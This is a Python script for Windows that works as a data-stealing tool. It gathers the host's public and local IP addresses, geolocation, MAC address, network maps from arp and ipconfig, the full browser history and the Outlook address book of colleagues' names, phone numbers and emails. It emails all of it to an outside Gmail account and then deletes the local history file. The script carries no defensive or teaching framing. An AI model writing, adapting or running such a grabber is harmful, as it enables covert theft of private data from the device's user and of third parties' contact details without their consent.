print('Importing Modules...')
from browser_history import get_history
from browser_history.utils import default_browser
from uuid import getnode as get_mac
import smtplib, ssl
from email.message import EmailMessage
import geocoder
import subprocess
import socket
from requests import get
import datetime
import json
import os
import sys
import platform
import time
import win32com.client


startTime = time.time()

#Operating System Information
print('Getting System Information...')
my_os = platform.system()
my_os_extra = sys.platform

#Get Timezone Information
print('Getting Timezone Information...')
now = datetime.datetime.now()
local_now = now.astimezone()
local_tz = local_now.tzinfo
local_tzname = local_tz.tzname(local_now)

#Public IP Configuration
print('Requesting IPV4 Adress from api.ipify.org...')
get_ip = get('https://api.ipify.org').content.decode('utf8')
print('Requesting IPV6 Adress from api.ipify.org...')
get_ipv6 = get('https://api64.ipify.org').content.decode('utf8')
ip = geocoder.ip(get_ipv6)

#IP JSON Configuration
print('Requesting IP Adress Information From ip-api.com...')
ip_json = get(f'http://ip-api.com/json/{get_ip}?fields=continent,country,region,regionName,city,district,zip,lat,lon,isp,reverse,proxy')
y = ip_json.json()

#Extract Details From IP ip-api JSON
print('Parsing JSON Data From API Request...')
country_code = y['country']
city_name = y['city']
region = y['regionName']
zip_code = y['zip']
district = y['district']
reverse_dns = y['reverse']
service_provider = y['isp']

latstring = str(y['lat'])
longstring = str(y['lon'])

ip_coords = latstring + ' ' + longstring
service_provider = y['isp']
using_vpn = y['proxy']

if using_vpn == True:
    using_vpn = 'Yes'
else:
    using_vpn = 'No'

if zip_code == '':
    zip_code = 'Not Detected'

if district == '':
    district = 'Not Detected'
    

#Local IP Configuration
print('Getting Local Network IP...')
hostname=socket.gethostname()   
IPAddr=socket.gethostbyname(hostname)

#Output Windows Commands arp -a
print('Sending Windows Commands...')
s = subprocess.run(['arp', '-a'], stdout=subprocess.PIPE)
s = str(s)
arp_formatted = s.replace(r"\r","")
arp_formatted = arp_formatted.replace(r"\n",r" \n")
arp_formatted = arp_formatted.replace(r" \n","\n")
arp_formatted = arp_formatted.replace("CompletedProcess(args=['arp', '-a'], returncode=0, stdout=b'","")

#Output Windows Commands ipconfig
a = subprocess.run(['ipconfig'], stdout=subprocess.PIPE)
a = str(a)
ipconfig = a.replace(r"\r",r" \n")
ipconfig = ipconfig.replace(r"\n",r" \n")
ipconfig = ipconfig.replace(r" \n","\n")
ipconfig = ipconfig.replace("CompletedProcess(args=['arp', '-a'], returncode=0, stdout=b'","")

#Local MAC Configuration
print('Grabbing MAC Adress...')
mac_adress = get_mac()

#Get Browser History
print('Browser-History module is detecting browsers on this device...')
outputs = get_history()
outputs.save("C:\\tmp\\history.csv")
print('Browser history saved successfully.')

#Get list of email contacts and saves to txt file
print("Grabbing list of Microsoft Outlook contacts on device")

outApp = win32com.client.gencache.EnsureDispatch("Outlook.Application")
outGAL = outApp.Session.GetGlobalAddressList()
entries = outGAL.AddressEntries

data_set = list()

for entry in entries:
    if entry.Type == "EX":
        user = entry.GetExchangeUser()
        if user is not None:
            if len(user.FirstName) > 0 and len(user.LastName) > 0:
                row = list()
                row.append(user.FirstName)
                row.append(user.LastName)
                row.append(user.MobileTelephoneNumber)
                row.append(user.BusinessTelephoneNumber)
                row.append(user.CompanyName)
                row.append(user.Department)
                row.append(user.PrimarySmtpAddress)
                """print("First Name: " + user.FirstName)
                print("Last Name: " + user.LastName)
                print("Mobile Phone Number: " + user.MobileTelephoneNumber)
                print("Business Phone Number: " + user.LastName)
                print("Company Name: " + user.CompanyName)
                print("Departement: " + user.Department)
                print("Email: " + user.PrimarySmtpAddress)"""
                data_set.append(row)

f = open('C:\\tmp\\email_contacts.txt', 'w')
f.write(str(data_set))
f.close()

#Email Content
print('Assigning Email Content...')

user = os.getlogin()

email_content = f"Device Name: {hostname}\n"
email_content = f"Username: {user}\n"
email_content += f"Operating System: {my_os}, {my_os_extra}\n\n\n"
email_content += f"TIMEZONE INFO\n\n"
email_content += f"System Timezone: {local_tzname}\n"
email_content += f"System Time: {now}\n\n\n"
email_content += f"IP ADRESS INFO\n\n"
email_content += f"Public IPV4 Adress: {get_ip}\n"
email_content += f"Public IPV6 Adress: {get_ipv6}\n"
email_content += f"Internet Service Provider: {service_provider}\n"
email_content += f"Reverse DNS of IP: {reverse_dns}\n"
email_content += f"Using VPN: {using_vpn}\n\n\n"
email_content += f"LOCAL NETWORK INFO\n\n"
email_content += f"Local IP Adress: {IPAddr}\n"
email_content += f"local MAC Adress: {mac_adress}\n\n\n"
email_content += f"GEOLOCATION INFO (Innacurate - bit.ly/ip_inaccuracy)\n\n"
email_content += f"City: {city_name}, {region}, {country_code}\n"
email_content += f"District: {district}\n"
email_content += f"ZIP Code: {zip_code}\n"
email_content += f"Lat/Long: {ip_coords}\n\n\n"
email_content += f"WINDOWS COMMAND OUTPUTS\n\n"
email_content += f"Mapping Network Using arp -a command:\n\n"
email_content += f"{arp_formatted}\n\n\n"
email_content += f"Mapping Network Using ipconfig command:\n\n"
email_content += f"{ipconfig}"

#Send the Email
sender = "youremail@email.com"
recipient = sender
app_password = "app password goes here"

print('Delivering Email...')
msg = EmailMessage()
msg.set_content(email_content)
msg["Subject"] = f"Action From {city_name}, {country_code} Detected at {now}"
msg["From"] = sender
msg["To"] = recipient

with open('C:\\tmp\\history.csv', 'rb') as csv:
    msg.add_attachment(csv.read(), maintype='application', subtype='octet-stream', filename=csv.name)

with open('C:\\tmp\\email_contacts.txt', 'rb') as txt:
    msg.add_attachment(txt.read(), maintype='application', subtype='octet-stream', filename=txt.name)    

context=ssl.create_default_context()

with smtplib.SMTP("smtp.gmail.com", port=587) as smtp:
    smtp.starttls(context=context)
    smtp.login(msg["From"], app_password)
    smtp.send_message(msg)

print('Email delivery successful.')
print('Deleting history.csv from C:\\tmp\\...')
os.remove('C:\\tmp\\history.csv')
executionTime = (time.time() - startTime)
print('Script completed in: ' + str(executionTime), ' Seconds')
